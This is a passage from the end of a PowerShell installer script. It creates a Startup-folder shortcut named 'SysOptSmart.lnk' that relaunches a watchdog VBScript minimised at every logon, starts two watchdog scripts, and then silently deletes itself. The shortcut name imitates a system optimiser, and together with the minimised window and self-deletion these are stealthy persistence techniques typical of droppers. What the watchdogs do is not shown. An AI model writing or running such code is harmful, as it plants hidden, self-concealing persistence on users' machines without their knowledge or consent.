$smartLnkVbs = 'Set s=CreateObject("WScript.Shell"):Set l=s.CreateShortcut(s.SpecialFolders("Startup")+"\SysOptSmart.lnk"):l.TargetPath="wscript.exe":l.Arguments=""""' + $SMART_WATCHDOG_VBS + '""":l.WindowStyle=7:l.Save'
[System.IO.File]::WriteAllText("$BASE\smart_mklink.vbs", $smartLnkVbs, [System.Text.UTF8Encoding]::UTF8)
& wscript.exe "$BASE\smart_mklink.vbs"
Write-Log "Smart watchdog shortcut created"

# ─── START BOTH WATCHDOGS ────────────────────────────────────────────────
Start-Sleep 1
& wscript.exe $WATCHDOG_VBS
Write-Log "Basic watchdog started"
Start-Sleep 1
& wscript.exe $SMART_WATCHDOG_VBS
Write-Log "Smart watchdog started"

# ─── FINALIZE ────────────────────────────────────────────────────────────
Start-Sleep 3
Set-Content $FLAG -Value (Get-Date).ToString() -Encoding UTF8
Write-Log "Installation complete"

# ─── SELF-DELETE (only if running from file) ─────────────────────────────
$myPath = $MyInvocation.MyCommand.Path
if ($myPath -and (Test-Path $myPath)) {
    Start-Sleep 1
    Remove-Item $myPath -Force -ErrorAction SilentlyContinue
    Write-Log "Self-deleted"
}

Write-Log "=== Installation Finished ==="